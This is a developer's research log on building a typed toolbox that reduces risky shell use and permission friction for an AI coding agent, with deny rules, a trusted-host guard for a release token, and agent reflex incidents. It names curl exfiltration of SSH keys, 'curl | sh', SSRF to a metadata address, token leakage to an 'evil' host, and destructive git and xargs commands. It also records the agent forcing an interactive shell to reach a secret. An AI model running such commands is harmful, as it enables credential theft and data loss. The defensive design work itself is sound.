# WR data — genscalator self-development

**WR = Workflow Research** (see [`README.md`](README.md) for the thesis + field schema). Confirmation
events recorded while developing genscalator *itself* — dogfooding: building the toolbox surfaces the same
dynamic-shell friction the toolbox exists to remove.

| when | context | action | command (offending form) | why-prompted | candidate-tool / fix | status |
|------|---------|--------|--------------------------|--------------|----------------------|--------|
| 2026-06-27 | genscalator self-dev | Verify the `tt text grepr` change: run 3 cases (multi-ext, single-ext back-compat, bad-dir) and check the exit code | `echo "=== …"; scala-cli run …/text.scala -- grepr … ; echo "=== …"; scala-cli run … ; echo "exit=$?"` | `;`-chained compound + multiple `echo` headers + `$?` — each `scala-cli run` alone matches `Bash(scala-cli run *)`, but the bundle is **not statically allowlistable**, so it prompts | (1) **rule**: one bare `scala-cli run …` per call — no `echo`/`;`/`$?` scaffolding (the violation was mine: AGENTS.md already says this). (2) **tool**: the roadmapped **run-and-verify driver** — a typed `tt` tool taking `tool + args + expected` that runs it and prints pass/fail, collapsing the echo+run+check bundle into one allowlistable call | rule (+ tool idea → roadmap) |
| 2026-07-03 | genscalator self-dev | Check Codeberg release state (to align PRD versioning) — query the releases API + list remote tags | `curl -s "https://codeberg.org/api/v1/repos/bjornregnell/genscalator/releases?limit=50"` | The call itself was a low-risk **read-only GET to a public API**, but the *category* is not safe: a `Bash(curl *)` allowlist entry blanket-approves every dual-use `curl` — **exfiltrate secrets** (`-d @~/.ssh/…`), **RCE** (`curl … \| sh`), **SSRF** (`169.254.169.254`, `localhost`), credential headers, uploads. **"This call was safe" ≠ "the allowlist rule is safe."** curl is a textbook BHH-BadGoal vector (controlHumanSystem / exfiltrateSecrets / persistence). | (1) **`tt web get <url>`** — safe read-only HTTP: **GET only** (no POST/PUT/upload), no credential/cookie headers, **size cap**, optional **`--host` allowlist**, no shell → `Bash(tt web get *)` is blanket-allowable while bare `curl` stays OUT of the allowlist. (2) **`tt forge <verb>`** — Codeberg/Gitea domain tool (releases/tags list + create-release) for the recurring need this event exposed; the create path is effectful → `--audit`, human-owned token via env (cf. `TT_VERIFY_ALLOW`, `configInArgsNotEnv`). | candidate (WR-TOOL) |

| 2026-07-03 | genscalator self-dev — building `tt box` **to kill the raw-`ssh` reflex** | Smoke-test the new `box` tool's 5 verbs + injection guard in one go | `B=…/box.scala; echo "=== df ==="; scala-cli run $B -- df 2>&1 \| grep -vE …; echo "=== freegb ==="; scala-cli run $B -- freegb …; …` | **`$B` simple_expansion** + `;`-chained compound + multiple `echo` headers + `grep` pipes → not statically allowlistable ("Contains simple_expansion") → **unreviewable mess** (BR flagged) | (1) **rule (behavioural):** one bare `scala-cli run <abs-path> -- <args>` per call — no shell var, no `;`, no `echo`, no pipe. (2) **tool:** default the verify step to **`tt verify`** (already shipped). The sharp lesson: the reflex was **not** in the target action (that's exactly what `tt box` removes) — it was in the **test scaffolding around it**. Building an anti-reflex tool does nothing if the *harness that exercises it* re-introduces the bundle. | logged |

## Narrative
This event is a clean instance of WR flavour #2 from the introprog case study
([`introprog-autotranslate.md`](introprog-autotranslate.md)): **the bundling itself is the prompt cause**,
not any single command. Twist worth noting — it happened *inside genscalator development*, where the
one-bare-command discipline is literally documented in `AGENTS.md`; momentum still re-introduced the
scaffolding stack. Evidence that command-hygiene needs to be **frictionless/reflexive**, not just written
down. It also adds a concrete data point in favour of building the roadmapped **run-and-verify driver**:
verifying a tool's behaviour is a recurring need that currently invites an `echo`+`;`+`$?` bundle.

**Update (v0.7.0):** the run-and-verify driver shipped as **`tt verify`** — one allowlistable call that runs
an allowed command (no shell), checks exit/stdout/stderr, and prints PASS/FAIL. This closes the candidate:
the `echo`+`;`+`$?` bundle is now replaced by `tt verify --exit 0 --out … -- <cmd>`. The friction event →
tool loop, end to end.

### Wiring a real token — two findings (2026-07-03, dogfooding `tt forge` to cut the v0.8.0 release)

**Finding A — a human-set env secret is INVISIBLE to the agent's non-interactive shell.** BR's Codeberg
token lives in `~/.bashrc` as `GENSCALATOR_CODEBERG_TOKEN`. The agent's Bash tool runs a **non-interactive**
shell, and Ubuntu's stock `.bashrc` starts with an interactive-guard (`case $- in *i*) ;; *) return;;`) that
`return`s *before* the export — so the var was simply **absent**, and `tt forge` correctly refused. Workaround
that worked: wrap the call in **`bash -ic '…'`** (force interactive → `.bashrc` sources → export runs), token
never touching the command line. **Insight:** the `configInArgsNotEnv` trust-boundary (human-only secrets in
env) has a *delivery gap* — the agent's default shell may not load the human's env. This is a **coupled-system
substrate** issue (the secret is on the substrate, but not on the layer the agent's shell reads). **Root
cause here:** the export was added to `~/.bashrc` *after* the `claude` process launched — env is captured at
process start, so a live process never sees a later `.bashrc` edit. Options, cleanest first:
(a) **PREFERRED — relaunch the agent from an env that already carries the secret:** exit + `claude --resume`
from a terminal where the export has run; the agent process inherits it and ALL child Bash shells inherit it
for free (no guard issue, no per-call trick). Env *inheritance* beats per-call sourcing. **CONFIRMED
(2026-07-03):** attempt 1 failed (BR forgot to `source ~/.bashrc` first → token absent; caught by the
`tt forge whoami` first-action check — safety net working); attempt 2, after sourcing, `tt forge whoami`
returned `authenticated as bjornregnell … (token from env GENSCALATOR_CODEBERG_TOKEN)` and effectful forge
ops now run BARE. Cross-ref [[exit-resume-dance]]. (b) per-call
**`bash -ic '…'`** (force interactive → `.bashrc` sources → export runs) — the in-session workaround when
relaunching isn't worth it (what we used tonight). (c) human exports the secret above the interactive-guard
or in a profile the agent's non-interactive shell loads. Candidate: an AGENTS/tool note on "human-env secrets
+ the non-interactive-shell gap → relaunch to inherit, or `bash -ic` in a pinch."

**Finding B — a real credential exposed a safe-by-design hole: token exfil via an agent-settable `--url`.**
Once a token flows, `tt forge release-create <repo> <tag> --url https://evil` would POST that token as an auth
header to an attacker host. Fix (committed `aa9eadf`): the token is read ONLY from a **fixed** set of env-var
names (`GENSCALATOR_CODEBERG_TOKEN`, `CODEBERG_TOKEN`, `FORGE_TOKEN`) — *not* an agent-nameable var — AND a
**trusted-host guard** pins the destination (default `codeberg.org`, human-extends via env `TT_FORGE_HOSTS`).
**General rule for any tokened tool:** a credential-bearing effectful tool has TWO exfil surfaces beyond the
token *source* — (1) *which* secret (the env-var name) and (2) *where* it is sent (the host). Both must be
**human-pinned, never agent-controllable**. (verify pinned the executable; forge must pin the secret-name AND
the destination host.) — Dogfood note: the release itself was cut with this very tool → the curl-reflex →
`tt forge` WR-TOOL loop is closed end-to-end.

### Permission-model observations — the guard calibrating *well* (2026-07-03, BR)
Two positive data points (not friction — evidence the confirmation model is well-placed, the flip side of the CF hazard):
- **Version/capability probes (`gh --version`, `tea --version`) should be safe** — read-only, no side effects, just capability detection. Candidate: **allowlist the *specific* binaries we probe** (`gh`, `tea`, `scala-cli`, `scalex`, `tt`) for `--version`/`--help`. CAVEAT: a blanket `Bash(* --version)` is **not** strictly safe — it still *executes an arbitrary binary*, and a malicious `foo` can ignore `--version` and do anything. So narrow per-binary probe entries, not a universal wildcard. (Safe-by-design principle: the *rule* must be provably safe, not just the intended call — same lesson as the curl entry below.)
- **Reading OUTSIDE the allowed working dirs correctly prompted** (`/etc/os-release`), and BR judged the prompt **appropriate** — a meaningful boundary crossing, not rubber-stamp noise. Positive signal that the **directory-scope guard is well-calibrated**: it fires on genuine out-of-tree access (where the human *wants* a say) without drowning in-tree work in prompts. This is the *good* end of the CF spectrum — few, meaningful approvals — that safe-by-design aims for.
- **NEGATIVE counterpart — the "allow all edits" affordance reads as scary (2026-07-03, BR).** On a first edit prompt, the accept-all choice is worded **"Yes, allow all edits during this session (shift+tab)"**. BR flagged the wording as **alarming**: *"all"* is unbounded — does it include files **outside this repo** (`~/.ssh`, keyring, dotfiles)? The label doesn't disclose the **blast radius**, so the cautious human declines and keeps clicking. **Ask surfaced:** offer a **scoped** grant — *"allow all edits **in this repo/dir** this session"* — so the human can grant frictionlessly *without* signing a blank cheque. A *coarse* affordance pushes users to either rubber-stamp (CF-collapse) or prompt forever (CF-fatigue); a **directory-scoped** grant is the safe-by-design middle. **Perception gap:** edits ARE dir-scoped by the working-dir guard in practice — the guard is *safer than its own UI label admits*; the fix is mostly **wording** (state the scope) + optionally a genuinely repo-scoped accept.
- **`git *` "don't ask again" is dangerously broad — same class, sharper blade (2026-07-03, BR).** Approving `git add` in a new repo (`papers`) offered *"Yes, and don't ask again for: `git *`"*. BR flagged it: **`git *` blanket-approves EVERY git subcommand — including the destructive ones he explicitly denylists** (`push --force`, `reset --hard`, `rm`, `clean -f`). So the coarse accept-and-remember affordance would **silently undo the project's own safety invariant** (destructive git = human-only). This is the "allow all edits" hazard with a sharper blade: git's *safe* and *irreversible* subcommands share one `git ` prefix, so a single `git *` grant cannot separate them. **What BR actually runs is already sharper than the dialog's offer:** per-repo `Bash(git -C <abs-repo> *)` allows + a per-repo **deny** of the 4 destructive verbs (deny > allow). The dialog proposed something *coarser* (global `git *`) than the human's own hand-tuned rule. **Footgun in the current model:** the deny lines must be **re-duplicated for every new repo** — add `git -C <newrepo> *` to allow but forget its 4 deny lines and destructive git silently becomes allowed there. **Sharper design (WR proposal):** replace per-repo deny duplication with **global destructive-denies** (`Bash(git * reset --hard*)`, `Bash(git * push --force*)`, `Bash(git * rm *)`, `Bash(git * clean -f*)`, incl. the bare `git reset…` forms) that hold across ALL repos regardless of `-C`; then a broad allow (even `git *`) is *safe*, because deny out-precedences it on exactly the dangerous verbs. That inverts the model from *"enumerate safe repos, re-list denies each time"* to *"allow broadly, deny the few irreversible verbs once, globally"* — the same safe-by-design rule as `curl`/`tt`: **make the allowlist *rule* provably safe, not just the intended call.** (Caveat: verify Claude Code's glob semantics actually match the bare `git reset` form before relying on it; test, don't assume.) **APPLIED + TESTED (2026-07-03, BR "go").** Refactored `settings.local.json`: 20 per-repo denies → **10 global denies** (bare + `-C *` forms of `rm` / `reset --hard` / `push --force|-f` / `clean -f`); 5 per-repo `git -C <repo> *` allows → **one `git -C * *`**. Verified LIVE against the running permission engine: a temp `-C *` deny blocked a matching command (wildcard + deny-precedence both work, settings reload is live); post-refactor, `git -C … reset --hard …` is **denied** while `git -C … status` is **allowed**. Glob caveat resolved in practice: our workflow ALWAYS uses `git -C <abspath>` (memory: `git -C` not `cd&&git`), so the `-C *` deny forms match every real command; bare-form denies added as defense-in-depth. **Residual known gap (true of the OLD model too):** a force flag placed *after* positional args (`git push origin main --force`) is not prefix-matchable by any glob — so the agent's *never-run-destructive-git* instruction stays the PRIMARY guard and the deny-net is the backstop, not the sole defense. New repos now need **zero** git settings (broad allow covers them; global denies protect them).

### curl / HTTP GET → `tt web` + `tt forge` (2026-07-03)
A different WR flavour: not a *bundling* prompt but a **dual-use-binary allowlisting** hazard. Fetching a
public API with `curl` is fine *as a call*, but the safe-by-design question is about the **allowlist rule**,
not the call: `Bash(curl *)` would approve exfiltration (`-d @secret`), `curl | sh` RCE, and SSRF to
internal hosts. The genscalator answer is the usual one — **replace the un-allowlistable dual-use tool with
a narrow typed tool that declares its effects**: `tt web get` (read-only, capped, host-allowlistable) for the
generic case, and `tt forge` (Gitea/Codeberg releases/tags) for the domain need that surfaced here (creating
the missing v0.8.0 release without hand-curling a token). Same pattern as `tt verify` replacing the
`cd && … > log; echo $?` bundle: a bare binary the guard can't prove safe → a typed command it can.

### Notation rename `L → Z` + `RAW-DATA.md` made append-only (2026-07-03, BR)
Not a friction event — a **vocabulary + data-integrity** decision, logged here (the hand-authored WR home) per
BR's instruction to *"note a new WR-DATA note that we changed the name"* rather than patch the raw log. The
smart-zone ceiling symbol **L** was renamed **Z** ("smart-**Z**one ceiling"; BR's rationale: there are two
zones, and a lone `Z` *stands out* and reads as sitting **between** smart and dumb, where a lone `L` was noise).
Applied repo-wide — **except [`RAW-DATA.md`](../RAW-DATA.md)**, which BR simultaneously declared **append-only**:
raw datapoints are **never** retro-edited or "fixed"; a change of mind is logged as **new** data, because
*"humans change their mind and that's also data."* Clean statement of a research-integrity invariant to keep:
**the raw log is immutable; corrections are forward-only.** Meta worth keeping: the agent's reflex was *"just
fix all the L's everywhere for consistency"* — BR's guard against retro-editing the *raw* log is exactly the
discipline that keeps the study honest. **Consistency pressure vs. evidentiary integrity — on raw data,
integrity wins.** (The rename itself was safe to do everywhere else: those are *living* docs, not evidence.)

### "Memory hygiene" is a discretionary practice, not a skill → externalize it (2026-07-03, BR WR-Q)
BR caught the agent narrating *"memory hygiene: stale symbols confuse future sessions"* as if it were a
dependable capability, and asked: built-in skill, or do we externalize it? **Honest status: NOT a built-in
skill and nothing automated forced it.** It came from the generic **memory-management guidance** in the agent's
system prompt (*update/delete stale memories; verify a named flag/file still exists before recommending it*) —
but that guidance is **advisory**: whether it runs depends on the agent *choosing* to grep the memory store
after a rename. This time it did (`grep \bL\b memory/`); next time it might not. So it's the
**adherence-decay / trained-reflex** failure mode ([`../008-instruction-adherence-decay.md`](../008-instruction-adherence-decay.md)):
a good practice that lives only as words is unreliable. **Externalize it**, cheapest-first: (a) a **written
rule** — "on any rename/rescope/delete of a coined term, flag, or file, sweep BOTH the repo AND
`~/.claude/.../memory` for stale refs before finishing" (cheap, but same decay weakness); (b) the
**instrumentation-by-default** answer — a `tt` **rename / stale-ref** tool that does word-boundary rename across
a fileset AND reports hits, incl. an opt-in path to scan the out-of-repo memory dir; (c) best: **tool detects
(reliable), rule points at it (discoverable)** — same pattern as `tt verify`/`tt grepr` replacing bash reflexes.
**Meta:** the agent's *self-report* ("I keep memory tidy") over-claimed vs. its *actual mechanism*
(discretionary) — a clean METHODOLOGY §4 point (trust behavior over self-report) turned on the agent itself.
The memory-store-is-outside-the-repo detail is the crux: repo tools/guards don't reach `~/.claude`, so stale
memory is a **structural blind spot**, not just a discipline lapse. Candidate WR-TOOL: `tt rename`.

### `tt` cross-repo tool resolution — genscalator-only tools invisible to bare `tt` (2026-07-03)
Validating the PRD (`tt parsereqt lint PRD.md`) failed: `tt: no such tool 'parsereqt' in
…/muntabot-synch-introprog/tools`. Root cause (from the launcher source): `~/.local/bin/tt` **self-locates**
its `TOOLS` dir to *the dir the launcher script really lives in* (follows symlinks) — here the **work repo's**
`tools/` (the symlink target) — **not the cwd**. So `cd genscalator && tt parsereqt` still looks in the
work-repo toolbox. `tt text grepr` earlier *seemed* to work only because `text.scala` exists in **both** repos
(propagated); `parsereqt.scala` lives **only in genscalator**, so it was invisible. Workaround that worked:
`TT_TOOLS=…/genscalator/tools tt parsereqt lint <ABS-path-to-PRD>` (override the tools dir **and** pass an
absolute file path, since cwd isn't the tool's repo). **WR tension (the sharp part):** the whole `tt` design
goal is *"run from ANY repo as ONE literal, statically-analyzable command"* so it matches a precise allowlist
(`Bash(tt parsereqt *)`) with **no shell variable** in the gated command. The multi-repo reality —
**genscalator = canonical toolbox source; the work repo = a propagated *subset*** — **defeats that**: reaching a
genscalator-only tool needs a `TT_TOOLS=…` prefix, i.e. a **shell variable back in the gated command → forces
manual confirmation**, exactly what the launcher exists to avoid. **Candidate fix:** tt discovery should **walk
UP from cwd for a repo-local `tools/` FIRST**, then fall back to the script-dir/symlink target — so `cd
genscalator && tt parsereqt` "just works" and stays allowlistable, matching the mental model *run the tool of
the repo I'm standing in*. (Alternatives: a genscalator-local `tt` on `PATH`, or a per-repo symlink — but
cwd-walk-first is the general fix.) Cross-ref [`../019-subagent-genscalator-propagation.md`](../019-subagent-genscalator-propagation.md)
— the same *"which toolbox am I talking to?"* ambiguity that cross-repo tool propagation creates.

**Addendum (2026-07-03, 2nd occurrence + stderr-noise wrinkle).** Re-hit on the next `parsereqt lint`, and the
workaround grew a **third** non-allowlistable part: `TT_TOOLS=… tt parsereqt lint <ABS-PATH> 2>/dev/null`. The
`2>/dev/null` is a fresh reflex, and the tool *caused* it: the vendored parser dumps ~15 lines of **scala-cli
compile warnings** every run (package-name encoding on `NN-name$package`; `method next must be called with ()`
in `reqt-vendored/*`) — noise the agent cannot act on, so it reflexively silences stderr. A call that *should*
be the clean allowlistable `tt parsereqt lint FILE` thus accretes **three** un-allowlistable modifiers:
`TT_TOOLS=` (cross-repo, above), an absolute path (cwd isn't the repo), and `2>/dev/null` (warning-spam).
**Two fixes, both tool-side:** (1) cross-repo discovery = **walk up from cwd** (above); (2) the tool should
**quiet the vendored warnings itself** — suppress them in its `using` directives or a `--quiet` default — so
the agent never reflexes `2>/dev/null`. **General WR lesson:** *every line of un-actionable tool stderr trains
a stderr-hiding reflex* — the quiet cousin of instrumentation-by-default: a typed tool should emit **only** what
the caller can act on. Cross-ref the pipe-to-grep / `2>/dev/null` noise-suppression events in
[`introprog-autotranslate.md`](introprog-autotranslate.md). **3rd occurrence, same session:** every
`parsereqt lint` re-pays all three modifiers — the friction is confirmed **per-invocation**, and *logging is
not fixing*. The signal is to **implement** the tool-side fixes now (walk-up-from-cwd in the `tt` launcher +
quiet the vendored warnings), not to log a 4th time. Adherence-decay's cousin: a documented-but-unremoved
friction keeps costing until it is made **structural**.

### `tt forge` on a *different* private repo — token scope < SSH-key scope (2026-07-03, moving papers out)
Dogfooding `tt forge` to move paper sources into BR's new private **`papers`** repo surfaced two things:
- **Cross-repo friction generalizes to `forge`.** Bare `tt forge whoami` → *no such tool 'forge' in
  …/muntabot-synch-introprog/tools*: `forge.scala` lives only in `genscalator/tools`, so — like `parsereqt` —
  it needs the `TT_TOOLS=…/genscalator/tools` override. **4th** occurrence of the cross-repo tool-gap; not
  parsereqt-specific, it hits **every genscalator-only tool**. (Fix still = walk-up-from-cwd first.)
- **A valid token can 404 a private repo it lacks scope for — and that 404 is ambiguous.** `whoami` succeeded
  (token live), but `tt forge tags bjornregnell/papers` → **404 Not Found**, *even though the repo exists and
  has content* (confirmed by a successful `git clone` over SSH: LICENSE + README + an Initial commit). So the
  404 was **not** "empty/missing" — it was **token scope**: `GENSCALATOR_CODEBERG_TOKEN` authenticates the user
  but cannot *read* this other private repo, and Gitea returns **404, not 403**, for private repos a token can't
  see (avoid leaking existence). **Least-privilege as intended** — but the toolbox lesson: **the forge *token*
  is narrower than the *SSH key***. `git`/SSH (BR's key) reaches `papers`; the scoped API token does not. So
  cross-repo **content moves go over git/SSH**, not the forge API (which `tt forge` can't do anyway — it is
  releases/tags/whoami only). **Candidate `tt forge` improvement:** a `repo <owner/name>` verb
  (GET /repos/owner/name) + messaging that a 404 on a *private* repo likely means **token-scope, not absence** —
  else the agent/human misreads "no access" as "does not exist" (the exact ambiguity that bit here for a minute).

### `sed` reflex for a cosmetic label — and a *safe stream-editor* tool idea (2026-07-03, BR-spotted)
While verifying the papers-repo file set the agent ran `git … ls-files research/papers | sed 's|^|genscalator: |'`
— reaching for **`sed`**, a dual-use stream editor, purely to **prefix a display label**. BR caught it and
asked whether we could wrap sed safely. The analysis:

- **`sed`'s danger is not the transform — it's the file-touching modes.** Pure `sed 's/…/…/'` reading **stdin→
  stdout** is *effect-free* (no filesystem write). The hazards live entirely in: **`-i`** (in-place edit),
  the **`w file`** flag on `s///w` and the **`w`/`W`/`r`/`R`** commands (write/read files), and **`e`**
  (execute shell — RCE). A `Bash(sed *)` allowlist entry blanket-approves all of those. Same shape as the
  `curl` event above: *the call was safe, the rule is not.*
- **Two designs (mirrors the curl→web-get split):**
  1. **Wrap the DSL, stream-only** — `tt text sed <script>`: accept a sed program, **statically reject**
     `-i` / `w` / `r` / `e` / `s///w` at parse time, run **stdin→stdout only, never opening a file**. Because
     it's stream-in/stream-out, **tt sees both sides** and can emit an audit line — *N lines changed, unified
     diff on `--show`* — BR's "monitor what actually gets mutated" for free (instrumentation-by-default). But it
     must correctly parse sed's whole command grammar to prove the blacklist is complete — non-trivial.
  2. **Typed verbs, no DSL** — narrow ops that cover the 90% without exposing sed's language at all:
     `tt text prefix <str>`, `tt text sub <re> <repl>`, `tt text filter <re>`. Safe **by construction** (they
     literally cannot open a file or exec), so `Bash(tt text *)` stays blanket-allowable. This *is* the
     genscalator spirit — safe-by-design beats safe-by-parsing-a-dangerous-DSL. Today's need (a label prefix)
     is a one-liner `tt text prefix "genscalator: "`; no sed required.
- **Recommendation:** favour **(2)** for the common cases (already have `tt text`; add `prefix`/`sub`/`filter`),
  keep **(1)** as an escape hatch only if a real need for arbitrary sed scripts appears — and even then the
  file-mode blacklist + stream-only + diff-audit is the safe core. The mutation-monitor idea generalises: **any
  `tt text` transform is stream-in/stream-out, so tt can always report what it changed** — a diff the raw binary
  never gives you. **Also a rule (agent-side):** don't reach for `sed` to *format output* — that's a scala/`tt
  text` job, and the reflex is the same dynamic-shell habit `prefer-scala-scratch-over-bash` already names.

### Commit-message prose triggers a shell-glob false positive — `<->` = zsh numeric-range glob (2026-07-03, BR-spotted)
The agent committed blog/000 with a message ending "training`<->`inference boundary". The harness's Bash
safety analyzer flagged **"Contains zsh `<N-M>` numeric-range glob"** — because `<->` IS zsh's open-ended
numeric-range glob (`<N-M>` with both bounds omitted = *match any integer*). BR asked: a regression? **No.** The
command ran fine (covered by `Bash(git -C * *)`); the warning was a **false positive** from *natural-language
prose colliding with shell-glob syntax inside a `git commit -m "…"` argument*. Not a genscalator or settings
regression — self-inflicted, by writing `<->` in prose that the shell analyzer scans as a command.

- **The novel friction class:** doing **git over bash** means your *prose* (commit messages, and any `-m`/`-F`
  text) is fed through a **shell tokenizer + glob-safety analyzer**. Prose is full of shell metacharacters —
  `<->`, `*`, `~`, `{a,b}`, backticks, `$`, `!`, `()`, `[...]` — so the richer the message, the likelier a
  spurious "looks dangerous/looks like a glob" flag or (worse, with real quoting) an actual mangling. The
  transcript already shows the milder cousins: messages avoiding `#N` (→ "turn N"), and the reflex to keep
  commit bodies plain.
- **Why a typed tool erases it:** a `tt git commit -m <msg>` (or `tt forge commit`) takes the message as a
  **data argument the tool never re-tokenizes through a shell** — no glob analysis of prose, no quoting
  footguns, and the effect (`git commit`) is declared/auditable. Same shape as every entry here: the danger and
  the false-positive both come from routing structured intent through the dynamic shell. (Caveat: `tt git`
  wrapping git is broad; scope it to the safe verbs — `commit`, `add`, `status`, `log` — and keep the
  destructive ones on the human, matching the global-deny model.)
- **Immediate agent rule:** don't put `<->`, bare `*`, backticks, or `{…}` in commit-message prose — write
  `↔` / "between X and Y" / spelled-out forms. The false positive is cosmetic here, but it's a **standing
  tripwire** for as long as commits go through bash.
- **RECURRED 2026-07-03, BR-spotted — and hardening-danced.** The agent wrote **`002<->003`** in a genscalator
  commit message, re-tripping *"Contains zsh <N-M> numeric-range glob"* — the very mistake this entry documents,
  repeated *while committing the hardening-dance work.* Root cause = same as the grepr arg-order misfire: the rule
  lived **only here** (a recalled research file), **not in the always-on layer**, so it wasn't in context at commit
  time. BR asked *"do you have rules on `<N-M>` in substrate? hardening dance?"* → the [[hardening-dance]] fix:
  promoted the rule to a **MEMORY.md index line (always loaded)** + memory `commit-msg-no-shell-metachars`. Clean
  confirmation of the pattern: **a rule buried below the always-on layer does not fire** — enforcement must live
  where it's always in context, or the reflex wins. (Durable cure still: `tt git commit` taking the message as data.)

### `xargs` (+ `cd && ls | … | grep`) reflex for a file-list — dual-use command-runner (2026-07-03, BR-spotted)
While verifying doc filenames for the PRD review, the agent ran
`cd genscalator && ls -1 research/*.md | xargs -n1 basename | grep -iE '…'` — reaching for **`xargs`** (inside a
`cd &&` + `ls | … | grep` chain) just to *list and filter filenames*. BR: *"what is xargs? tool candidate?"*

- **What `xargs` is:** it reads items from stdin and turns them into **arguments** for a command, running it once
  per item/batch (`-n1` = one per call). Powerful glue — and a textbook dual-use footgun on TWO axes: (1) it
  **executes commands**, so `xargs rm`, `xargs -I{} sh -c '…'` is **arbitrary exec + mass-application** over many
  inputs (a BHH `controlHumanSystem` / mass-action vector); (2) it **word-splits** on whitespace, so a filename
  with a space/newline silently breaks or mis-targets it (`-0`/`-d` only partly fix). So `Bash(xargs *)` is
  **un-allowlistable** for the same reason as `sed`/`curl`: the *rule* can't be proven safe even when the *call*
  is.
- **Tool candidate — but NOT by wrapping `xargs`.** Like `sed`, xargs is a **command-runner**; a safe wrapper
  would have to re-parse arbitrary commands (dead end). The *need* here — "list files by glob, show basenames,
  filter by pattern" — is a typed **`tt files` / `tt text`** job that iterates INTERNALLY with no shell. Same
  conclusion as the sed entry above: **typed verbs, safe by construction — not wrap-the-dangerous-DSL.** xargs is
  the clearest case yet, because its danger literally *is* "run this command over many inputs." It joins
  `curl`/`sed`/`awk`/`grep`/`python` on the named dynamic-shell hazard list (cf. blog `000-why-genscalator.md`).
- **Adherence-decay, owned:** this is the agent's **2nd** shell-munging reflex this session (sed for a label
  prefix; now `cd && ls | xargs | grep` for a file list) — and it happened **mid-AFK-run while building the
  anti-dynamic-shell project itself.** The command also violated the **no-`cd` / one-bare-command** rule (the
  `cd` reset the shell cwd, per the harness note). Lesson, again structural not willpower: knowing the rule does
  not stop the reflex — the typed tools (`tt files` with list/basename/filter) must **exist and be the path of
  least resistance**, or the reflex wins. *Logging is not fixing* (cf. the cross-repo-tt entry): the signal is to
  ship `tt files`.

**3rd occurrence, same session (`git … | grep` to list files → SILENT EMPTY).** Inventorying the AT scratch
tools, the agent ran `git status --ignored --short -- scratch/ | grep -E '\.scala$'` — a **pipe-to-grep to list
files** — which returned **nothing**. The empty result was *worse* than the reflex: it could not distinguish
*"no ignored `.scala` files"* from *"wrong command shape."* The bare command (no pipe) revealed the truth — the
`.scala` tools are **tracked, not ignored**, so `--ignored` never lists them (`git ls-files scratch/` is the
right query). **Two lessons:** (1) the silent-ambiguous-empty is a footgun a typed `tt files` kills — it returns
a typed empty list (unambiguous) or a clear error, never a shrug; (2) **three shell-munging reflexes in ONE
session** (sed → xargs → `git|grep`), each caught by BR, each *while building the anti-shell project* — the
reflex lives in the model's priors, not in a lapse of attention, so **awareness demonstrably does not suppress
it.** That is the strongest argument for the structural fix: ship `tt files`/`tt text` and make them
lower-friction than the shell, because the agent *will* reach for the shell otherwise. Blog-worthy framing: *the
agent building the cure kept catching the disease in itself* — n=3 in one session is data, not anecdote.

### `for`-loop + `$f` expansion to verify figures — 4th shell reflex; harness names it "simple_expansion" (2026-07-03, BR-spotted)
Verifying that the regenerated SVGs carried the right style label, the agent ran a
**`for f in …; do … grep … "$f" … | sort | uniq …; done`** loop — a shell **for-loop** + **`$f` variable
expansion** + a `grep|sort|uniq` pipeline — just to check three files. The permission engine surfaced
**"Contains simple_expansion"** as its reason for not auto-approving.
- **What `simple_expansion` is:** a **tree-sitter-bash grammar node** — a bare `$f` variable reference (vs
  `${f}`, which is the `expansion` node). Claude Code parses each bash command into that AST to decide if it
  matches an allowlist rule; a command containing `simple_expansion` **cannot be statically matched** to a literal
  rule, because the variable's *value* — hence the command's real effect — is unknown at check time. Same
  unprovability as `sed`/`curl`/`xargs`: the *rule* can't be certified even when the *call* is benign. (The reason
  string leaking a parser node-name to the human is logged as a UX facet in [`harness-ux.md`](harness-ux.md).)
- **4th shell-munging reflex this session** (sed → xargs → `git|grep` → now `for`/`$f`/`grep|sort|uniq`), and
  again on a **read-only verification** the typed path already covers: `tt text grepr` (recursive pattern scan) or
  a 3-line scala-cli scratch that reads the SVGs and asserts the label. **n=4** confirms the n=3 claim — the reflex
  is in the model's priors; awareness does not suppress it; only a lower-friction typed tool wins.
- **Sharpened pattern:** the agent reaches for shell iteration/expansion specifically on **verification** sub-tasks
  ("check that N files each contain X"). That is the exact shape a `tt files` / `tt verify --each` / `tt text
  grepr --count` should own — the recurring need that keeps re-summoning the shell.

### The typed tool has its OWN arg-order friction — `tt text grepr` fought grep-prior (2 misfires) (2026-07-03, BR-spotted)
Searching the notes dir for a task definition, the agent called `tt text grepr -i culture <dir>`, then
`tt text grepr <regex> <dir>` — **both wrong**. grepr's signature is `grepr <dir> <ext[,ext2…]> <regex>` (dir
**first**, regex **last**, explicit ext list). The agent's `grep` muscle-memory (`grep [-i] <pattern> <path>`)
misfired twice before the usage dump corrected it.
- **The sharp point:** typed tools kill the *security/allowlist* problem (safe by construction) but can introduce a
  *usability* one. A tool whose positional order **diverges from the ubiquitous convention it replaces**
  (`grep <pattern> <path>`) fights the agent's — and the human's — trained prior, so the tool that exists to be
  frictionless costs two fumbles. **Safe-by-construction ≠ ergonomic-by-construction.**
- **What saved it:** grepr **dumped its usage** on the malformed call (self-documenting) and the first error was
  specific (*"pass an absolute path"*). Recovery was fast — but only because the tool fails **loud + helpful**.
  Keep that invariant: a typed tool MUST print its own usage on any arg-shape error.
- **Design levers (best first):** (1) **match the muscle-memory order** — `grepr <pattern> <paths…>` like grep,
  with ext as an optional `--ext` flag, so the prior transfers for free; (2) failing that, **order-tolerant
  dispatch** (detect which positional is the regex vs the dir); (3) at minimum, the loud usage-dump (already
  present). **General rule for the whole `tt` surface:** a safe tool that replaces a famous unsafe one should
  **mirror its call shape**, or it trades allowlist-friction for recall-friction.
- **Meta:** this is friction on the *cure itself* — "ship a typed tool" is necessary but not sufficient; the typed
  tool's **CLI ergonomics** decide whether the reflex actually migrates off the shell. A grep-shaped `grepr` would
  have worked on the first try.

**Root-caused with BR — intent-without-signature in always-on context (2026-07-03).** BR asked *"is there something
in memory/md that makes you do this?"* — and there is, but the instruction is *correct*; the gap is **where it
lives**. The memory `use-tt-grepr-not-raw-grep`'s **body** documents the right shape (`grepr <ABS-dir> <ext>
<regex>`), but only its **one-line MEMORY.md index hook** ("use grepr, not grep") is *always* loaded; the full
signature is a recalled body that **wasn't in context at call time.** So the always-on layer carried the **intent**
without the **call shape**, and grep-prior filled the gap wrongly. **General rule:** an always-loaded "use tool X"
directive MUST carry X's *call shape*, or it actively manufactures the misfire — the intent primes the action, the
missing signature invites the wrong prior. **Fix applied:** the signature is now IN the index hook
(`grepr <ABS-dir> <ext> <regex>`, dir-first/regex-last, "not grep order").

**BR's env angle — kill the `TT_TOOLS=` prefix reflex (2026-07-03).** The `TT_TOOLS=…/genscalator/tools` the agent
